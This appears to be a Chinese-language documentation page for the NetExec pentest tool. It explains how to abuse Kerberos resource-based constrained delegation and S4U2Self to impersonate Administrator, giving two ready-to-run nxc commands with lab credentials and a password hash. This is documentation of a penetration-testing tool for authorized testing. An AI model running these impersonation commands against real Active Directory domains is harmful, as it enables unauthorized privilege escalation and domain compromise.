---
description: 基于资源的约束委派 (RBCD)
---

# 🆕 委派

## RBCD

如果你有一个对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性被设置为你控制的账户，你可以在 NetExec 中使用 impersonate 标志来自动执行基于资源的约束委派并模拟任何用户：

{% code fullWidth="false" %}
```
nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption><p>使用 NetExec 进行 RBCD</p></figcaption></figure>

## S4U2Self

如果你有一个计算机账户，你几乎总是可以使用 s4u2self 扩展获取本地管理员权限：

```
nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self
```

<figure><img src="../../.gitbook/assets/self (2).png" alt=""><figcaption><p>使用 NetExec 的委派功能滥用 S4U2Self</p></figcaption></figure>

## 相关资源：

{% embed url="https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd" %}

{% embed url="https://www.thehacker.recipes/a-d/movement/kerberos/delegations/s4u2self-abuse" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" %}
